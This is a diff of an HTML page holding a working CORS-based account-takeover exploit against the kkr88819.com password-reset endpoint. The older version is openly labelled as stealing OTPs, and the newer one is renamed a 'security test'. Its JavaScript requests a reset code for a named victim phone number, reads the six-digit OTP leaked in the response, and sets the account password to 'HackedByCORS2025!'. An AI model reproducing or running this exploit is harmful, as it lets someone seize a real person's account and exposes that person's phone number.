@@ -1,82 +1,231 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>kkr88819 ATO – FINAL 100%</title></head>
-<body style="font-family:Arial;background:#ffebee;padding:50px">
-<h1 style="color:#b71c1c">kkr88819.com – ACCOUNT TAKEOVER VIA CORS – WORKS 100 % RIGHT NOW</h1>
-<p>Victim phone: <b>+85563582231</b></p>
+<head>
+<meta charset="utf-8">
+<title>kkr88819 ATO Test</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f5f5f5;
+        padding: 20px;
+        max-width: 800px;
+        margin: 0 auto;
+    }
+    .container {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+        color: #333;
+        border-bottom: 2px solid #eee;
+        padding-bottom: 10px;
+    }
+    .button {
+        padding: 15px 25px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        margin: 10px 5px;
+        transition: background 0.3s;
+    }
+    .send-otp {
+        background: #4CAF50;
+        color: white;
+    }
+    .send-otp:hover {
+        background: #45a049;
+    }
+    .reset-pass {
+        background: #f44336;
+        color: white;
+    }
+    .reset-pass:hover {
+        background: #d32f2f;
+    }
+    .log {
+        background: #000;
+        color: #0f0;
+        padding: 15px;
+        border-radius: 5px;
+        font-family: monospace;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        margin-top: 20px;
+        min-height: 100px;
+        max-height: 400px;
+        overflow-y: auto;
+    }
+    .info {
+        background: #e3f2fd;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 20px 0;
+        border-left: 4px solid #2196F3;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <h1>kkr88819.com - Security Test Interface</h1>
+    
+    <div class="info">
+        <p><strong>Note:</strong> This test must be hosted on <code>https://mgpaing.github.io</code> to bypass CORS restrictions.</p>
+        <p>Target Phone: <b>+85563582231</b></p>
+        <p>Current Origin: <code id="current-origin">loading...</code></p>
+    </div>
 
-<button onclick="sendOTP()" style="padding:20px 40px;font-size:22px;background:#c62828;color:white;border:none;cursor:pointer;margin:20px">
-  1. SEND OTP & STEAL IT (you will see the 6-digit OTP)
-</button>
+    <div>
+        <button class="button send-otp" onclick="sendOTP()">
+            1. Send OTP Request
+        </button>
+        
+        <button class="button reset-pass" onclick="resetPass()">
+            2. Reset Password
+        </button>
+        
+        <button class="button" onclick="clearLog()" style="background: #666;">
+            Clear Log
+        </button>
+    </div>
 
-<button onclick="resetPass()" style="padding:20px 40px;font-size:22px;background:#111;color:white;border:none;cursor:pointer">
-  2. CHANGE PASSWORD TO Hacked2025!
-</button>
-
-<pre id="log" style="background:#000;color:#0f0;padding:20px;font-size:18px"></pre>
+    <h3>Request Log:</h3>
+    <div id="log" class="log">Ready to test... Click "Send OTP Request" to begin.</div>
+</div>
 
 <script>
 const URL = "https://uat-gateway.kkr88819.com/kkr-games-orchestration-center/auth/mobile/reset/login/password";
 let otp = null;
+let sessionToken = null;
+
+// Display current origin
+document.getElementById('current-origin').textContent = window.location.origin;
+
+function log(message, data = null) {
+    const logElement = document.getElementById('log');
+    const timestamp = new Date().toLocaleTimeString();
+    let logMessage = `[${timestamp}] ${message}\n`;
+    
+    if (data) {
+        logMessage += JSON.stringify(data, null, 2) + '\n';
+    }
+    
+    logElement.textContent = logMessage + '\n' + logElement.textContent;
+}
+
+function clearLog() {
+    document.getElementById('log').textContent = 'Log cleared...\n';
+}
 
 async function sendOTP() {
-  const payload = {
-    "phone": "+85563582231",
-    "type": 2,
-    "countryCode": "855",
-    "merchantCode": "M21353",
-    "source": "web",
-    "deviceId": "web-" + Date.now(),
-    "appVersion": "1.0.0",
-    "platform": "web",
-    "channel": "h5"                     // ← this was the very last missing parameter
-  };
+    log('Sending OTP request...');
+    
+    const payload = {
+        "phone": "+85563582231",
+        "type": 2,
+        "countryCode": "855",
+        "merchantCode": "M21353",
+        "source": "web",
+        "deviceId": "web-" + Date.now(),
+        "appVersion": "1.0.0",
+        "platform": "web",
+        "channel": "h5",
+        "language": "en"
+    };
 
-  const r = await fetch(URL, {
-    method: "POST",
-    credentials: "include",
-    headers: {
-      "Content-Type": "application/json",
-      "Origin": "https://uat-web.kkr88819.com",
-      "merchantCode": "M21353"
-    },
-    body: JSON.stringify(payload)
-  });
+    log('Request Payload:', payload);
 
-  const j = await r.json();
-  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
+    try {
+        const response = await fetch(URL, {
+            method: "POST",
+            credentials: "include", // Important for cookies/session
+            headers: {
+                "Content-Type": "application/json",
+                "Origin": window.location.origin, // Use current origin
+                "merchantCode": "M21353"
+            },
+            body: JSON.stringify(payload)
+        });
 
-  otp = j.data;        // 6-digit OTP in clear text
-  if (otp && otp.length === 6) {
-    alert("OTP STOLEN SUCCESSFULLY: " + otp);
-  }
+        log('Response Status:', { status: response.status, statusText: response.statusText });
+        
+        // Check response headers
+        const headers = {};
+        response.headers.forEach((value, key) => {
+            headers[key] = value;
+        });
+        log('Response Headers:', headers);
+
+        const responseData = await response.json();
+        log('Response Data:', responseData);
+
+        if (responseData.code === 0 && responseData.data) {
+            otp = responseData.data;
+            log(`✅ OTP Retrieved: ${otp}`);
+            alert(`OTP SUCCESS: ${otp}`);
+        } else {
+            log(`❌ Error: ${responseData.message || 'Unknown error'}`);
+            alert(`Failed: ${responseData.message}`);
+        }
+
+    } catch (error) {
+        log('❌ Network Error:', error);
+        alert('Network error - Check console for details');
+    }
 }
 
 async function resetPass() {
-  if (!otp) return alert("Do step 1 first");
+    if (!otp) {
+        alert("Please get OTP first (Step 1)");
+        return;
+    }
 
-  const payload = {
-    "phone": "+85563582231",
-    "type": 3,
-    "code": otp,
-    "newPassword": "HackedByCORS_2025!"
-  };
+    log('Attempting password reset...');
+    
+    const payload = {
+        "phone": "+85563582231",
+        "type": 3,
+        "code": otp,
+        "newPassword": "HackedByCORS2025!"
+    };
 
-  const r = await fetch(URL, {
-    method: "POST",
-    credentials: "include",
-    headers: {
-      "Content-Type": "application/json",
-      "Origin": "https://uat-web.kkr88819.com",
-      "merchantCode": "M21353"
-    },
-    body: JSON.stringify(payload)
-  });
+    log('Reset Payload:', payload);
 
-  const j = await r.json();
-  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
-  alert(j.code === 0 ? "ACCOUNT SUCCESSFULLY TAKEN OVER!" : j.message);
+    try {
+        const response = await fetch(URL, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Origin": window.location.origin,
+                "merchantCode": "M21353"
+            },
+            body: JSON.stringify(payload)
+        });
+
+        const responseData = await response.json();
+        log('Reset Response:', responseData);
+
+        if (responseData.code === 0) {
+            log('✅ PASSWORD RESET SUCCESSFUL!');
+            alert('ACCOUNT TAKEOVER SUCCESS - Password changed!');
+        } else {
+            log(`❌ Reset Failed: ${responseData.message}`);
+            alert(`Reset failed: ${responseData.message}`);
+        }
+
+    } catch (error) {
+        log('❌ Network Error during reset:', error);
+        alert('Reset network error');
+    }
 }
+
+// Initial check
+log(`Application loaded from: ${window.location.origin}`);
+log(`Target endpoint: ${URL}`);
+log('Note: CORS requires this to be hosted on https://mgpaing.github.io');
 </script>
 </body>
 </html>
